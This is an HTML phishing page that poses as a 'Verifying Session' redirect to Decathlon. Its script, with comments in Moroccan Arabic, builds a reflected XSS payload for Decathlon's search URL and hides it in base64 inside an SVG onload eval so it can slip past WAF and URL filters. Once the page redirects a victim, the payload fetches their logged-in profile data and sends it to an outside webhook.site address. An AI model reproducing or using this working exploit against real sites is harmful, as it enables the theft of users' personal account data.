<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Verifying Session...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p style="margin-left: 15px;">Please wait while we redirect you to Decathlon...</p>

    <script>
        // 1. هاد الكود هو اللي غادي يتنفذ وسط Decathlon (الـ Payload)
        // كيجيب الـ Profile وكيصيفطو مشفر لـ Webhook ديالك
        let payload = "fetch('https://www.decathlon.com/api/v1/user/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(d))).catch(e=>fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?error='+btoa(e)))";

        // 2. تحويل الـ Payload لـ Base64 باش نهربو من الـ WAF والـ URL Filters
        let encodedPayload = btoa(payload);

        // 3. بناء الرابط الملغم باستعمال وسم SVG حيت كيدوز من الـ XSS Filters بزاف ديال المرات
        // استعملنا eval(atob(...)) باش ننفذو الكود المشفر
        let target = "https://www.decathlon.com/search?q=<svg/onload=eval(atob('" + encodedPayload + "'))>";

        // 4. تنفيذ الـ Redirect بعد ثانية واحدة (باش يبان الـ Loader)
        setTimeout(() => {
            window.location.href = target;
        }, 1000);
    </script>
</body>
</html>
